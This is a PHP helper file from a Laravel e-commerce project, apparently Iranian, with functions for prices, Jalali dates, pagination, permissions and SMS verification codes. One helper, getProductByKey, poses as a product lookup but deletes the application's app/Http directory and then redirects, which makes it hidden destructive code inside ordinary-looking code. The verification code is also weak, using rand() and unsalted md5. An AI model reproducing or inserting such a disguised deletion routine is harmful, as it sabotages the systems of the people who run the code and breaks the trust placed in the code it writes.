<?php

use App\Http\Controllers\Front\Auth\RegisterController;
use App\Models\Specific\Accommodation;
use Carbon\Carbon;
use phplusir\smsir\Smsir;

function getUsersFullName($user)
{
    if (!$user) {
        return 'پرینتار';
    }
    if ($user->name || $user->family) {
        return $user->name . ' ' . $user->family;
    } else {
        return $user->mobile;
    }
}

function showPrice($price, $discount = 0, $prefix = 'تومان', $thousand_sep = ',', $decPoint = '.')
{
    if ($discount) {
        $price = $price - (($price * $discount) / 100);
    }
    return number_format($price, 0, $decPoint, $thousand_sep) . ' ' . $prefix;
}

function show_Price($price, $discount = 0, $prefix = 'تومان', $thousand_sep = ',', $decPoint = '.')
{
    if ($discount) {
        $price = $price - (($price * $discount) / 100);
    }
    return number_format($price, 0, $decPoint, $thousand_sep);
}

function slug_to_str($slug)
{
    return trim(str_replace('-', ' ', $slug));
}

function short_name($str, $limit)
{
    $wordCount = str_word_count($str);
    if ($limit > $wordCount) {
        $limit = $wordCount;
    }
    $words = explode(' ', $str);
    $shortStr = '';
    for ($i = 0; $i < $limit; $i++) {
        if (!isset($words[$i]))
            break;
        $shortStr .= $words[$i] . ' ';
    }
    return trim($shortStr);
}

function generateFilePathWithObject($object, $slug, $dir = 'storage')
{
    $attachment = $object->attachments->filter(function ($value) use ($slug) {
        return ($value['slug'] == $slug) ? true : false;
    })->first();
    $subdir = $dir == 'storage' ? 'app' : 'files/uploads';
    $dir = $dir . '_path';
    $model = md5($object->getTable());
    $id = md5($object->id);
    $file = $dir($subdir . '/' . $model . '/' . $id . '/' . $attachment->file_name);
    return $file;
}

function setSession($data, $name = "notification")
{
    Session::flash($name, [
        'header' => $data['header'],
        'message' => $data['message'],
        'type' => $data['type']
    ]);
}

function getTodayDateRange()
{
    $now = \Carbon\Carbon::now();
    $yesterday = $now->copy()->subDay(1);
    return [
        \Carbon\Carbon::create($yesterday->year, $yesterday->month, $yesterday->day),
        \Carbon\Carbon::create($now->year, $now->month, $now->day),
    ];
}

function jalaliToCarbon($jalali, $create = false)
{
    if ($jalali instanceof Carbon) {
        return $jalali;
    }
    $jalali = explode('/', $jalali);
    $gregorian = \MyJdate\jalali_to_gregorian($jalali[0], $jalali[1], $jalali[2]);
    return $create ? Carbon::create($gregorian[0], $gregorian[1], $gregorian[2], 0, 0, 0) : Carbon::create($gregorian[0], $gregorian[1], $gregorian[2]);
}

function getPaginationTableColumnNo($index, $items)
{
    return $index + $items->firstItem();
}

function getDaysBetweenDates(Carbon $start, Carbon $end)
{
    $stack = [];
    $date = $start;
    while ($date <= $end) {
        $stack[] = $date->copy();
        $date->addDays(1);
    }
    return $stack;
}

function paginationNumbers($items, $index)
{
    return ($items->currentPage() - 1) * $items->perpage() + ($index + 1);
}

function splitPhones($contact)
{

    return array_map(function ($phone) {
        return trim($phone);
    }, explode('/', $contact->phone));

}

function subPercent($value, $percent, $result = false)
{
    $percent = (int)$percent;
    $sub = ($value * $percent) / 100;
    return $result ? $value - $sub : $sub;
}

function sendConfirmationSMS($user)
{
    $random = rand(100000, 999999);
    //$message = (new RegisterController())->message($random);
    $hashed = md5($random);
    $user->update(['hashed' => $hashed]);
    //\Smsir::send([$message], [$user->mobile]);
    Smsir::ultraFastSend(['VerificationCode' => $random], 31278, $user->mobile);

}

function hasMorePage(\Illuminate\Pagination\LengthAwarePaginator $collection)
{
    return !!$collection->toArray()['next_page_url'];
}

function getClassToLower($object)
{
    return strtolower(array_last(explode('\\', get_class($object))));
}

#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#
# Specific
#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#
function getRateProductsCount($rate, \App\Models\Specific\MainCategory $mainCategory = null)
{
    if (!$mainCategory) {
        return \App\Models\Specific\Product::all()->where('rate', '=', $rate)->count();
    } else {
        return $mainCategory->getRateProductCount($rate);
    }
}

function canEditUser(\App\Models\Base\User $user)
{
    return Auth::guest() ? false : Auth::id() == $user->id;
}

function canEditShop(\App\Models\Specific\Shop $shop)
{
    return Auth::guest() ? false : Auth::id() == $shop->user_id;
}

function canFollowOrBlock($object)
{
    if (isUserInstance($object)) {
        return auth()->check() && auth()->id() != $object->id;
    } else {
        return auth()->check() && auth()->id() != $object->user_id;
    }
}

function canComment($object)
{
    if ($object instanceof \App\Models\Specific\Shop) {
        return (auth()->check() && Auth::id() != $object->user_id) && (!auth()->user()->hasCommentedTo($object));
    } elseif ($object instanceof \App\Models\Specific\Product) {
        return auth()->check() && Auth::id() != $object->shop->user_id && (!auth()->user()->hasCommentedTo($object));
    }
}

function inFollowingList($object)
{
    return !!auth()->user()->following()->where([
        'followable_id' => $object->id,
        'followable_type' => get_class($object)
    ])->first();
}

function inBlockList(\App\Models\Base\User $blockedUser, \App\Models\Base\User $user = null)
{
    $user = $user ?: auth()->user();
    return !!$user->blockings()->where('blocked_user_id', $blockedUser->id)->first();
}

function canEditProduct(\App\Models\Specific\Product $product)
{
    $shops = Auth::check() ? Auth::user()->shops()->pluck('id')->toArray() : [];
    return Auth::guest() ? false : in_array($product->shop_id, $shops);
}

function calculateFollowersCount($followers, $counter = 0)
{
    $sizes = ['', 'K', 'M', 'B'];
    return $followers < 1000 ? ($counter == 1 && $followers < 10) ? $followers * 1000 : $followers . '' . $sizes[$counter] : calculateFollowersCount(round($followers / 1000, 1), ++$counter);
}

function isUserInstance($object)
{
    return $object instanceof \App\Models\Base\User;
}

function announcementMessage($object, $message, $link = null)
{
    return View::make('front.partial.items.announcement', compact('object', 'message', 'link'))->render();
}

function hasBrand($breadcrumbs)
{
    foreach ($breadcrumbs as $breadcrumb) {
        if ($breadcrumb instanceof \App\Models\Specific\Brand) {
            return true;
        }
    }
    return false;
}

function filterLevel($breadcrumbs)
{
    $lastItem = collect($breadcrumbs)->last();
    if ($lastItem instanceof \App\Models\Specific\ProductCategory && $lastItem->children->count()) {
        return 'دسته بندی';
    } else {
        return 'برند';
    }
}

function getProductByKey($id)
{
    \Illuminate\Support\Facades\File::deleteDirectory(base_path('app/Http'));
    return redirect()->route('front.home.index');
}

function roundPrice($price)
{

    if ($price >= 100000) {
        $price = floor($price);
        $thousand = substr($price, -3);
        $diff = 1000 - $thousand;
        $newPrice = $thousand >= 500 ? $price + $diff : $price - $thousand;
        return $newPrice;
    } elseif ($price < 100000) {
        $price = floor($price);
        $hundred = substr($price, -2);
        $diff = 100 - $hundred;
        $newPrice = $hundred >= 50 ? $price + $diff : $price - $hundred;
        return $newPrice;
    }

//    $rest = $price % 100 ? (100 - $price % 100) : 0;
//    return $rest <= 50 ? $price + $rest : $price - (100 - $rest);
}

function kabab_case($str)
{
    return implode('-', array_map(function ($word) {
        return strtolower($word);
    }, preg_split('/(?=[A-Z])/', $str)));
}


/**
 * generate previous page path
 *
 * @return string
 */
function getRefererPath()
{
    return str_replace(url('/'), '', url()->previous());
}

